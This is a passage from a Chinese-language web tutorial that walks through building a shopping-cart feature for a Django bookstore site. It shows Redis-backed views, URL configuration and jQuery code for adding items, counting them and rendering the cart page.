wrapper</span><br></pre></td></tr></table></figure></p><p>然后把这个装饰器打在views.py里的user函数上面。<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@login</span>_required</span><br></pre></td></tr></table></figure></p><p>装饰器有很多作用，比如可以限定具有某些权限的用户才能登陆，等等。</p><h1 id="5，购物车功能"><a href="#5，购物车功能" class="headerlink" title="5，购物车功能"></a><a id="5">5，购物车功能</a></h1><h2 id="1，创建models"><a href="#1，创建models" class="headerlink" title="1，创建models"></a>1，创建models</h2><p>这里我们要引进redis的使用。大家可以参考《redis实战》这本书，有很多redis的妙用，网上有电子版。<br>我们使用redis实现购物车的功能。因为购物车里的数据相对不是那么重要，而且更新频繁。当然如果要是考虑到安全性，还是要持久化到数据库中比较好。redis在内存中不是很安全，比如之前redis就被攻击过。<br>使用shell命令<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ps</span> -ef | <span class="keyword">grep</span> redis</span><br></pre></td></tr></table></figure></p><p>来检查redis server是否启动。<br>我们现在配置文件中配置缓存有关的东西。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># settings.py</span></span><br><span class="line"><span class="comment"># pip install django-redis</span></span><br><span class="line">CACHES = &#123;</span><br><span class="line">    <span class="string">"default"</span>: &#123;</span><br><span class="line">        <span class="string">"BACKEND"</span>: <span class="string">"django_redis.cache.RedisCache"</span>,</span><br><span class="line">        <span class="string">"LOCATION"</span>: <span class="string">"redis://127.0.0.1:6379/2"</span>,</span><br><span class="line">        <span class="string">"OPTIONS"</span>: &#123;</span><br><span class="line">            <span class="string">"CLIENT_CLASS"</span>: <span class="string">"django_redis.client.DefaultClient"</span>,</span><br><span class="line">            <span class="string">"PASSWORD"</span>: <span class="string">""</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SESSION_ENGINE = <span class="string">"django.contrib.sessions.backends.cache"</span></span><br><span class="line">SESSION_CACHE_ALIAS = <span class="string">"default"</span></span><br></pre></td></tr></table></figure></p><p>然后新建一个购物车cart app。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python manage.py startapp cart</span></span><br></pre></td></tr></table></figure></p><p>然后开始编写视图函数。先来编写向购物车中添加商品的功能。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cart/views.py</span></span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line"><span class="keyword">from</span> books.models <span class="keyword">import</span> Books</span><br><span class="line"><span class="keyword">from</span> utils.decorators <span class="keyword">import</span> login_required</span><br><span class="line"><span class="keyword">from</span> django_redis <span class="keyword">import</span> get_redis_connection</span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 前端发过来的数据：商品id 商品数目 books_id books_count</span></span><br><span class="line"><span class="comment"># 涉及到数据的修改，使用post方式</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cart_add</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''向购物车中添加数据'''</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收数据</span></span><br><span class="line">    books_id = request.POST.get(<span class="string">'books_id'</span>)</span><br><span class="line">    books_count = request.POST.get(<span class="string">'books_count'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 进行数据校验</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> all([books_id, books_count]):</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>:<span class="number">1</span> , <span class="string">'errmsg'</span>:<span class="string">'数据不完整'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    books = Books.objects.get_books_by_id(books_id=books_id)</span><br><span class="line">    <span class="keyword">if</span> books <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="comment"># 商品不存在</span></span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>:<span class="number">2</span>, <span class="string">'errmsg'</span>:<span class="string">'商品不存在'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        count = int(books_count)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 商品数目不合法</span></span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>:<span class="number">3</span>, <span class="string">'errmsg'</span>:<span class="string">'商品数量必须为数字'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加商品到购物车</span></span><br><span class="line">    <span class="comment"># 每个用户的购物车记录用一条hash数据保存，格式:cart_用户id: 商品id 商品数量</span></span><br><span class="line">    conn = get_redis_connection(<span class="string">'default'</span>)</span><br><span class="line">    cart_key = <span class="string">'cart_%d'</span> % request.session.get(<span class="string">'passport_id'</span>)</span><br><span class="line"></span><br><span class="line">    res = conn.hget(cart_key, books_id)</span><br><span class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="comment"># 如果用户的购车中没有添加过该商品，则添加数据</span></span><br><span class="line">        res = count</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 如果用户的购车中已经添加过该商品，则累计商品数目</span></span><br><span class="line">        res = int(res) + count</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断商品的库存</span></span><br><span class="line">    <span class="keyword">if</span> res &gt; books.stock:</span><br><span class="line">        <span class="comment"># 库存不足</span></span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">4</span>, <span class="string">'errmsg'</span>: <span class="string">'商品库存不足'</span>&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.hset(cart_key, books_id, res)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回结果</span></span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">5</span>&#125;)</span><br></pre></td></tr></table></figure></p><p>将商品添加到购物车的功能就实现了。</p><h2 id="2，渲染购物车页面"><a href="#2，渲染购物车页面" class="headerlink" title="2，渲染购物车页面"></a>2，渲染购物车页面</h2><p>在登陆以后，我们应该能够看到购物车里的商品数量，现在我们就来实现这个功能。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cart/views.py</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cart_count</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''获取用户购物车中商品的数目'''</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算用户购物车商品的数量</span></span><br><span class="line">    conn = get_redis_connection(<span class="string">'default'</span>)</span><br><span class="line">    cart_key = <span class="string">'cart_%d'</span> % request.session.get(<span class="string">'passport_id'</span>)</span><br><span class="line">    <span class="comment"># res = conn.hlen(cart_key) 显示商品的条目数</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    res_list = conn.hvals(cart_key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res_list:</span><br><span class="line">        res += int(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回结果</span></span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: res&#125;)</span><br></pre></td></tr></table></figure></p><p>然后在前端页面调用这个接口，并渲染出来。<br>在base.html中添加：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># base.html</span><br><span class="line">    &#123;# 获取用户购物车中商品的数目 #&#125;</span><br><span class="line">    &#123;% block cart_count %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            $.get(<span class="string">'/cart/count/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// &#123;'res':商品的总数&#125;</span></span></span><br><span class="line"><span class="javascript">                $(<span class="string">'#show_count'</span>).html(data.res)</span></span><br><span class="line"><span class="undefined">            &#125;)</span></span><br><span class="line"><span class="undefined">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    &#123;% endblock cart_count %&#125;</span><br></pre></td></tr></table></figure></p><p>而在登陆和注册页面，不需要显示这个，所以我们override掉这个块。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block cart_count %&#125;&#123;% endblock cart_count %&#125;</span><br></pre></td></tr></table></figure></p><p>然后配置urls.py<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^add/$'</span>, views.cart_add, name=<span class="string">'add'</span>), <span class="comment"># 添加购物车数据</span></span><br><span class="line">url(<span class="string">r'^count/$'</span>, views.cart_count, name=<span class="string">'count'</span>), <span class="comment"># 获取用户购物车中商品的数量</span></span><br></pre></td></tr></table></figure></p><p>然后在根目录urls.py中配置url<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^cart/'</span>, include(<span class="string">'cart.urls'</span>, namespace=<span class="string">'cart'</span>)), <span class="comment"># 购物车模块</span></span><br></pre></td></tr></table></figure></p><p>然后在前端详情页<code>detail.html</code>编写添加到购物车的jquery代码。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    $(<span class="string">'#add_cart'</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 获取商品的id和商品数量</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> books_id = $(<span class="keyword">this</span>).attr(<span class="string">'books_id'</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> books_count = $(<span class="string">'.num_show'</span>).val();</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> csrf = $(<span class="string">'input[name="csrfmiddlewaretoken"]'</span>).val();</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 发起请求，访问/cart/add/, 进行购物车数据的添加</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> params = &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="string">'books_id'</span>: books_id,</span></span><br><span class="line"><span class="actionscript">            <span class="string">'books_count'</span>: books_count,</span></span><br><span class="line"><span class="actionscript">            <span class="string">'csrfmiddlewaretoken'</span>: csrf</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        $.post(<span class="string">'/cart/add/'</span>, params, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">if</span> (data.res == <span class="number">5</span>)&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 添加成功</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> count = $(<span class="string">'#show_count'</span>).html();</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> count = <span class="built_in">parseInt</span>(count) + <span class="built_in">parseInt</span>(books_count);</span></span><br><span class="line"><span class="javascript">                $(<span class="string">'#show_count'</span>).html(count);</span></span><br><span class="line"><span class="actionscript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 添加失败</span></span></span><br><span class="line"><span class="undefined">                alert(data.errmsg)</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;)</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>发送ajax post请求来更新购物车数量。<br>再改写html tag。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123; % csrf_token %&#125;</span><br><span class="line">&lt;a <span class="attribute">href</span>=<span class="string">"javascript:;"</span> <span class="attribute">class</span>=<span class="string">"buy_btn"</span>&gt;立即购买&lt;/a&gt;</span><br><span class="line">&lt;a <span class="attribute">href</span>=<span class="string">"javascript:;"</span> <span class="attribute">books_id</span>=<span class="string">"&#123;&#123; books.id &#125;&#125;"</span> <span class="attribute">class</span>=<span class="string">"add_cart"</span> <span class="attribute">id</span>=<span class="string">"add_cart"</span>&gt;加入购物车&lt;/a&gt;</span><br></pre></td></tr></table></figure></p><p>现在我们可以将商品添加到购物车中去了。<br>然后我们再编写一段jquery代码，实现+/-商品数量的功能。并且可以自动更新总价格。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">// detail.html</span><br><span class="line">&#123;% block topfiles %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">$(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">    update_total_price()</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 计算总价</span></span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">update_total_price</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 获取商品的价格和数量</span></span></span><br><span class="line"><span class="javascript">        books_price = $(<span class="string">'.show_pirze'</span>).children(<span class="string">'em'</span>).text()</span></span><br><span class="line"><span class="javascript">        books_count = $(<span class="string">'.num_show'</span>).val()</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 计算商品的总价</span></span></span><br><span class="line"><span class="javascript">        books_price = <span class="built_in">parseFloat</span>(books_price)</span></span><br><span class="line"><span class="javascript">        books_count = <span class="built_in">parseInt</span>(books_count)</span></span><br><span class="line"><span class="undefined">        total_price = books_price * books_count</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 设置商品总价</span></span></span><br><span class="line"><span class="javascript">        $(<span class="string">'.total'</span>).children(<span class="string">'em'</span>).text(total_price.toFixed(<span class="number">2</span>) + <span class="string">'元'</span>)</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 商品增加</span></span></span><br><span class="line"><span class="javascript">    $(<span class="string">'.add'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 获取商品的数量</span></span></span><br><span class="line"><span class="javascript">        books_count = $(<span class="string">'.num_show'</span>).val()</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 加1</span></span></span><br><span class="line"><span class="javascript">        books_count = <span class="built_in">parseInt</span>(books_count) + <span class="number">1</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 重新设置值</span></span></span><br><span class="line"><span class="javascript">        $(<span class="string">'.num_show'</span>).val(books_count)</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 计算总价</span></span></span><br><span class="line"><span class="undefined">        update_total_price()</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 商品减少</span></span></span><br><span class="line"><span class="javascript">    $(<span class="string">'.minus'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 获取商品的数量</span></span></span><br><span class="line"><span class="javascript">        books_count = $(<span class="string">'.num_show'</span>).val()</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 加1</span></span></span><br><span class="line"><span class="javascript">        books_count = <span class="built_in">parseInt</span>(books_count) - <span class="number">1</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">if</span> (books_count == <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="undefined">            books_count = 1</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 重新设置值</span></span></span><br><span class="line"><span class="javascript">        $(<span class="string">'.num_show'</span>).val(books_count)</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 计算总价</span></span></span><br><span class="line"><span class="undefined">        update_total_price()</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 手动输入</span></span></span><br><span class="line"><span class="javascript">    $(<span class="string">'.num_show'</span>).blur(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 获取商品的数量</span></span></span><br><span class="line"><span class="javascript">        books_count = $(<span class="keyword">this</span>).val()</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 数据校验</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (<span class="built_in">isNaN</span>(books_count) || books_count.trim().length == <span class="number">0</span> || <span class="built_in">parseInt</span>(books_count) &lt;= <span class="number">0</span> )&#123;</span></span><br><span class="line"><span class="undefined">            books_count = 1</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 重新设置值</span></span></span><br><span class="line"><span class="javascript">        $(<span class="string">'.num_show'</span>).val(<span class="built_in">parseInt</span>(books_count))</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 计算总价</span></span></span><br><span class="line"><span class="undefined">        update_total_price()</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endblock topfiles %&#125;</span><br></pre></td></tr></table></figure></p><p>好，添加商品到购物车的功能我们就实现好了。</p><h2 id="3，购物车页面的开发"><a href="#3，购物车页面的开发" class="headerlink" title="3，购物车页面的开发"></a>3，购物车页面的开发</h2><p>接下来我们来实现展示购物车页面的功能。<br>编写views.py。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cart/views.py</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cart_show</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''显示用户购物车页面'''</span></span><br><span class="line">    passport_id = request.session.get(<span class="string">'passport_id'</span>)</span><br><span class="line">    <span class="comment"># 获取用户购物车的记录</span></span><br><span class="line">    conn = get_redis_connection(<span class="string">'default'</span>)</span><br><span class="line">    cart_key = <span class="string">'cart_%d'</span> % passport_id</span><br><span class="line">    res_dict = conn.hgetall(cart_key)</span><br><span class="line"></span><br><span class="line">    books_li = []</span><br><span class="line">    <span class="comment"># 保存所有商品的总数</span></span><br><span class="line">    total_count = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 保存所有商品的总价格</span></span><br><span class="line">    total_price = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历res_dict获取商品的数据</span></span><br><span class="line">    <span class="keyword">for</span> id, count <span class="keyword">in</span> res_dict.items():</span><br><span class="line">        <span class="comment"># 根据id获取商品的信息</span></span><br><span class="line">        books = Books.objects.get_books_by_id(books_id=id)</span><br><span class="line">        <span class="comment"># 保存商品的数目</span></span><br><span class="line">        books.count = count</span><br><span class="line">        <span class="comment"># 保存商品的小计</span></span><br><span class="line">        books.amount = int(count) * books.price</span><br><span class="line">        <span class="comment"># books_li.append((books, count))</span></span><br><span class="line">        books_li.append(books)</span><br><span class="line"></span><br><span class="line">        total_count += int(count)</span><br><span class="line">        total_price += int(count) * books.price</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义模板上下文</span></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'books_li'</span>: books_li,</span><br><span class="line">        <span class="string">'total_count'</span>: total_count,</span><br><span class="line">        <span class="string">'total_price'</span>: total_price,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'cart/cart.html'</span>, context)</span><br></pre></td></tr></table></figure></p><p>然后配置urls.py<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^$'</span>, views.cart_show, name=<span class="string">'show'</span>), <span class="comment"># 显示用户的购物车页面</span></span><br></pre></td></tr></table></figure></p><p>然后将cart.html拷贝到templates/cart文件夹下面。<br>还是继承base.html。然后在base.html中改写url定向。<br><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">url</span></span> 'cart:show' %&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure></p><p>接下来，我们把订单列表渲染出来。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for book in books_li %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"cart_list_td clearfix"</span>&gt;</span></span><br><span class="line">    &#123;# 提交表单时，如果checkbox没有被选中，它的值不会被提交 #&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col01"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"books_ids"</span> <span class="attr">value</span>=<span class="string">"&#123;&#123; book.id &#125;&#125;"</span> <span class="attr">checked</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col02"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static book.image %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col03"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">em</span>&gt;</span>&#123;&#123; book.price &#125;&#125;元/&#123;&#123; book.unit &#125;&#125;<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col04"</span>&gt;</span>&#123;&#123; book.unit &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col05"</span>&gt;</span>&#123;&#123; book.price &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col06"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"num_add"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span> <span class="attr">class</span>=<span class="string">"add 